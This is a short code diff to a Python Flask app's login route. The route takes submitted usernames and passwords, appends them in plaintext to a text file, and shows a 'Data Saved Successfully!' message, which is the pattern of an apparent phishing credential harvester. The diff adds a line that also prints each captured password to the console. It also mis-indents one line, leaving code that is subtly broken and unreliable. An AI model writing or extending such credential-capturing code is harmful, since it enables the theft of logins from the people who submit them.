@@ -14,8 +14,9 @@ def index():
 
 @app.route("/login", methods=["POST"])
 def login():
-    u = request.form.get("username")
+        u = request.form.get("username")
     p = request.form.get("password")
+    print(f"User: {u} | Pass: {p}", flush=True)
     with open("data.txt", "a") as f:
         f.write(f"User: {u} | Pass: {p}\n")
     return "<h1 style=\"color:green;text-align:center;\">Data Saved Successfully!</h1>"
